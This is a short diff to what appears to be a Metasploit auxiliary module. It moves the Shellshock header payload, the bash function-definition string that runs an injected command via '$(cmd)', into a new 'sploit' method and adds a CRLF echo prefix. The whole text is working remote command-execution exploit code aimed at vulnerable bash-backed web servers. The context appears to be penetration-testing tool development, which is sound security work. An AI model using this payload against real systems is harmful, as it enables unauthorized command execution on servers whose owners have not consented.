@@ -101,9 +101,13 @@ class Metasploit4 < Msf::Auxiliary
       'method' => datastore['METHOD'],
       'uri' => normalize_uri(target_uri.path),
       'headers' => {
-        datastore['HEADER'] => "() { :;};echo #{@marker}$(#{cmd})#{@marker}"
+        datastore['HEADER'] => sploit(cmd)
       }
     )
+  end
+
+  def sploit(cmd)
+    %Q{() { :;};echo -e "\\r\\n#{@marker}$(#{cmd})#{@marker}"}
   end
 
   def marker
